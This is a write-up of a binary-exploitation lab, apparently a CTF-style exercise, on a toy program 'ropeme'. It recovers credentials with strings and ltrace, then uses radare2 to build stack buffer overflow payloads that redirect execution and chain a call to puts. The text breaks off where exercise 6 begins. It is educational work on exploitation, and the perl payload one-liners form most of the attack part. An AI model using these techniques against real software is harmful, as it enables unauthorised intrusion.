========
Write-up
========

Exercise 1
==========

Using `strings ./ropeme` we find a line "admin42". It happens to be the
username.

Exercise 2
==========

You can trace calls to library functions with ltrace. This includes strcmp:

::

    $ ltrace ./ropeme admin42
    __libc_start_main(0x400692, 2, 0x7fff9cc08e58, 0x400730 <unfinished ...>
    strcmp("admin42", "admin42")                     = 0
    printf("Enter password: ")                       = 16
    fgets("test\n", 512, 0x7fd40a2d0900)             = 0x7fff9cc08d20
    strcmp("test\n", "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227")
    = -80
    puts("Wrong password")                           = 15
    Enter password: Wrong password
    +++ exited (status 1) +++


The password is "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227". To
see it without the octal notation one can use printf:

::

    $ printf "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227"
    ĳùð−÷<>[×


That explains why is didn't show up using "strings"!

Exercise 3
==========

Reading ltrace's output we can see that fgets is used to get user input
reading up to 512 chars from stdin. What happens if we really write 512
chars?

::

    $ perl -e 'print "A" x 512' | ./ropeme admin42
      Segmentation fault      (core dumped) | ./ropeme admin42

Oh! This smells the buffer overflow! To know where exactly we overwrite the
instruction pointer (eip) I'll use a De Bruijn sequence (I could guess but
this is faster). This is done using radare2 tools.

Here ragg2 will generate a 500-bytes long sequence with no repetitions as
hexadecimal values, rax2 will convert it into ascii values, and we put it in
the clipboard using xclip so that we are able to paste it later.

::

    $ ragg2 -P 500 | rax2 -s - | xclip

Radare2 is then used in debug mode with rarun2 to launch the program with an
argument. We could use gdb but... well... radare2 ^^

::

    $ r2 -d rarun2 program=./ropeme arg1=admin42
        ...
    [0x7fd31872dd80]> dc
    Debugging pid = 12194, tid = 1 now
    [0xf77aeb50]> dc
    Enter password: <paste here from clipboard>
    Wrong password
    [+] SIGNAL 11 errno=0 addr=0x41416641 code=1 ret=0
    [+] signal 11 aka SIGSEGV received 0

Here we have the address at which it tried to return: 0x41416641
Still in radare2 we convert it into an offset to know how much padding we
need:

::

    [0x41416641]> woO 0x41416641
    92

Let's try that!

::

    $ perl -e 'print "A" x 92 . "B" x 4' | xclip
    $ r2 -c "dc;dc" -d rarun2 program=./ropeme arg1=admin42
        ...
    Enter password: <paste>
    Wrong password
    [+] SIGNAL 11 errno=0 addr=0x42424242 code=1 ret=0
    [+] signal 11 aka SIGSEGV received 0
     -- Find cp850 strings with 'e cfg.encoding=cp850' and '/s'
    [0x42424242]>

It works! We have taken eip! We just have to redirect it to section printing
the winning message. Let's disassemble the function checking the password:

::

    $ r2 ropeme
    [0x080483b0]> aa
    [0x080483b0]> s sym.check_password
    [0x080484e6]> pdf
    ╒ (fcn) sym.check_password 145
    │           ; var int local_22     @ ebp-0x58
    │           ; CALL XREF from 0x080485c5 (sym.check_password)
    │           0x080484e6    55             push ebp
    │           0x080484e7    89e5           mov ebp, esp
    │           0x080484e9    83ec58         sub esp, 0x58
    │           0x080484ec    83ec0c         sub esp, 0xc
    │           0x080484ef    6877860408     push str.Enter_password:
    │           0x080484f4    e867feffff     call sym.imp.printf
    │             ^- sym.imp.printf(unk)
    │           0x080484f9    83c410         add esp, 0x10
    │           0x080484fc    a160990408     mov eax, dword [obj.stdin__GLIBC_2.0]
    │           0x08048501    83ec04         sub esp, 4
    │           0x08048504    50             push eax
    │           0x08048505    6800020000     push 0x200
    │           0x0804850a    8d45a8         lea eax, [ebp-local_22]
    │           0x0804850d    50             push eax
    │           0x0804850e    e85dfeffff     call sym.imp.fgets
    │             ^- sym.imp.fgets(unk, unk, unk)
    │           0x08048513    83c410         add esp, 0x10
    │           0x08048516    85c0           test eax, eax
    │       ┌─< 0x08048518    7517           jne 0x8048531
    │       │   0x0804851a    83ec0c         sub esp, 0xc
    │       │   0x0804851d    6888860408     push str.Unable_to_get_the_password
    │       │   0x08048522    e859feffff     call sym.imp.puts
    │       │     ^- sym.imp.puts(unk)
    │       │   0x08048527    83c410         add esp, 0x10
    │       │   0x0804852a    b801000000     mov eax, 1
    │      ┌──< 0x0804852f    eb44           jmp 0x8048575
    │      │└─> 0x08048531    83ec08         sub esp, 8
    │      │    0x08048534    68a3860408     push str.________________
    │      │    0x08048539    8d45a8         lea eax, [ebp-local_22]
    │      │    0x0804853c    50             push eax
    │      │    0x0804853d    e80efeffff     call sym.imp.strcmp
    │      │      ^- sym.imp.strcmp(unk, unk)
    │      │    0x08048542    83c410         add esp, 0x10
    │      │    0x08048545    85c0           test eax, eax
    │     ┌───< 0x08048547    7517           jne 0x8048560
    │     ││    0x08048549    83ec0c         sub esp, 0xc
    │     ││    0x0804854c    68b4860408     push str.Yeah__You_win_
    │     ││    0x08048551    e82afeffff     call sym.imp.puts
    │     ││      ^- sym.imp.puts(unk)
    │     ││    0x08048556    83c410         add esp, 0x10
    │     ││    0x08048559    b800000000     mov eax, 0
    │    ┌────< 0x0804855e    eb15           jmp 0x8048575
    │    │└───> 0x08048560    83ec0c         sub esp, 0xc
    │    │ │    0x08048563    68c3860408     push str.Wrong_password
    │    │ │    0x08048568    e813feffff     call sym.imp.puts
    │    │ │      ^- sym.imp.puts(unk)
    │    │ │    0x0804856d    83c410         add esp, 0x10
    │    │ │    0x08048570    b801000000     mov eax, 1
    │    │ │    ; JMP XREF from 0x0804855e (sym.check_password)
    │    │ │    ; JMP XREF from 0x0804852f (sym.check_password)
    │    └─└──> 0x08048575    c9             leave
    ╘           0x08048576    c3             ret

Ok, so given the disassembly the key section is at 0x0804854c. Let's try that:

::

    $ perl -e 'print "A" x 92 . "\x4c\x85\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    Yeah! You win!
    Segmentation fault (core dumped)

Finally!


Exercise 4
==========

When calling another function, the caller (say `main`) pushes the arguments
on the stack (not always, see further) and uses the call opcode that pushes
the current address on the stack for later return and then jumps to the
sub-routine location.

The sub-routine then pushes the ebp address to define its own stack frame,
takes the arguments from the stack to store them in local variables (often
pushing them back or just stocking them in registers), does its thing, then
pops the stack (the ebp address) and returns to the address at the top of the
stack (our previous return address put there by call). The instruction
pointer is incremented and the program continues.

I left away the stack allocation process besides push/pop because it isn't
very relevent here. Also there are other calling conventions besides the
stack. In x86_64, as the registers are bigger and more numerous they are the
primary way to pass arguments.

So the stack look like that before entering puts:

::

    ^ [string address]
    | [return address]

Note that as the stack is decreasing, pushing puts data at the bottom of this
diagram which is the top of the stack (facing downward). Also I represented
it without really using the opcode "call", that's why there is the return
address.

For strcmp it is similar, but note that the arguments are pushed in reverse
order:

::

    ^ [str2   address]
    | [str1   address]
    | [return address]

Exercise 5
==========

To display the password we will hijack a call to puts(). Such a call means
the stack will look somewhat like that before the call:

::

    ^ [password    address]
    | [puts return address]
    | [puts        address]
    | [padding to overflow]

The address of puts is direct:

::

    $ rabin2 -s ropeme | grep puts
    vaddr=0x08048380 paddr=0x00000380 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts

So [puts address] is 0x08048380. In the same way we find the password address:

::

    $ rabin2 -z ropeme
    ...
    vaddr=0x080486a3 ... string=ĳùð−÷<>[×
    ...

By the way note how rabin2 isn't troubled at all by the weird password.

So far our stack is something like: "80830408XXXXXXXXa3860408". Right now the
return address isn't really important, we will return to the end of the
check_password function, just before the return statement, at address
0x08048575.

::

    # Stack wanted:
    #
    # ^ [password    address] = 0x080486a3
    # | [puts return address] = 0x08048575
    # | [puts        address] = 0x08048380
    # | [padding to overflow] = "A" x 92

    $ perl -e 'print "A" x 92 . "\x80\x83\x04\x08\x75\x85\x04\x08\xa3\x86\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    ĳùð−÷<>[×
    Segmentation fault (core dumped)

Yeah!

Exercise 6
==========

We want to print an arbitrary message. The printing part can be done with
puts() but what about the "getting the message" part? The program provides
fgets(), and we can make use of it.
